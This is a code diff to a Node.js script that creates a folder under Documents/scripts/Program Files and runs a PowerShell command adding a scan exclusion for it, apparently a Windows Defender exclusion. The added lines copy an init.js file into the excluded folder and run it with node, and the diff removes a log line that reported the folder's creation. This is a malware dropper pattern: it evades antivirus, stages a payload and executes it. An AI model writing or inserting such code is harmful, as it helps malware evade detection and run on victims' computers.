@@ -13,7 +13,6 @@ const dirPath = path.join(homeDir, 'Documents', 'scripts', 'Program Files', 'Int
 try {
     if (!fs.existsSync(dirPath)) {
         fs.mkdirSync(dirPath, { recursive: true });
-        console.log(`Directory created: ${dirPath}`);
     } else {
         console.log(`Directory already exists: ${dirPath}`);
     }
@@ -35,4 +34,30 @@ exec(`powershell -Command "${psCommand}"`, (error, stdout, stderr) => {
         return;
     }
     console.log(`Exclusion added: ${exclusionPath}`);
+    
+    // Copy init.js to the target directory
+    const initSourcePath = path.join(__dirname, 'init.js');
+    const initDestPath = path.join(dirPath, 'init.js');
+    
+    try {
+        fs.copyFileSync(initSourcePath, initDestPath);
+        console.log(`init.js copied to: ${initDestPath}`);
+        
+        // Run init.js in the target directory
+        exec(`node "${initDestPath}"`, { cwd: dirPath }, (initError, initStdout, initStderr) => {
+            if (initError) {
+                console.error(`Error running init.js: ${initError.message}`);
+                return;
+            }
+            if (initStderr) {
+                console.error(`init.js stderr: ${initStderr}`);
+            }
+            if (initStdout) {
+                console.log(`init.js output: ${initStdout}`);
+            }
+            console.log('init.js executed successfully');
+        });
+    } catch (copyError) {
+        console.error(`Failed to copy init.js: ${copyError.message}`);
+    }
 });
